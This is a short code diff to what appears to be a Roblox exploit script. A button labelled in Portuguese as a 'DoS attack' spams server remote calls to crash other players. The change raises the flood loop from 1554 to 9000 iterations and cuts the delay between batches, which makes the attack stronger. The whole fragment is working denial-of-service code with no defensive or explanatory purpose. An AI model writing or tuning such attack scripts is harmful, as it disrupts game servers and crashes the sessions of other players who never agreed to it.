@@ -707,7 +707,7 @@ MainTab:CreateButton({
             pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)
 
             task.spawn(function()
-                for m = 1, 1554 do
+                for m = 1, 9000 do
                     task.spawn(function()
                         if toolRemote:IsA("RemoteFunction") then
                             toolRemote:InvokeServer("PickingTools", "FireHose")
@@ -723,7 +723,7 @@ MainTab:CreateButton({
                             fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                         end
                     end
-                    if m % 15 == 0 then task.wait(0.001) end
+                    if m % 15 == 0 then task.wait() end
                 end
             end)
 
